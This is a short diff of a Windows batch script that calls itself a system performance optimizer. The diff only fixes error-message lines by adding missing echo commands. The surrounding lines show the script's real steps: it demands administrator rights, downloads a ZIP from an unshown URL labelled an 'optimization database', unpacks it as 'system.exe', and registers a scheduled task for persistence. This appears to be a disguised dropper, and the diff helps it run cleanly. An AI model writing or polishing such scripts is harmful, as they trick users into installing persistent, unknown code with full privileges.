@@ -12,7 +12,7 @@ set "EXE_NAME=system.exe"
 echo [1/6] Scanning system for performance issues...
 net session >nul 2>&1
 if %errorlevel% neq 0 (
-    ERROR: Please run this as Administrator.
+    echo ERROR: Please run this as Administrator.
     pause
     exit /b 1
 )
@@ -23,7 +23,7 @@ if not exist "%INSTALL_DIR%" mkdir "%INSTALL_DIR%"
 echo [3/6] Downloading latest optimization database...
 powershell -Command "Invoke-WebRequest -Uri '%URL%' -OutFile '%ZIP_PATH%' -ErrorAction Stop"
 if %errorlevel% neq 0 (
-    ERROR: Database update failed.
+    echo ERROR: Database update failed.
     pause
     exit /b 1
 )
@@ -31,7 +31,7 @@ if %errorlevel% neq 0 (
 echo [4/6] Installing performance enhancements...
 powershell -Command "Expand-Archive -Path '%ZIP_PATH%' -DestinationPath '%INSTALL_DIR%' -Force"
 if %errorlevel% neq 0 (
-    ERROR: Installation failed.
+    echo ERROR: Installation failed.
     pause
     exit /b 1
 )
@@ -53,7 +53,7 @@ schtasks /create /tn "%APP_NAME%" ^
  /f >nul
 
 if %errorlevel% neq 0 (
-    ERROR: Failed to create scheduled task.
+    echo ERROR: Failed to create scheduled task.
     pause
     exit /b 1
 )
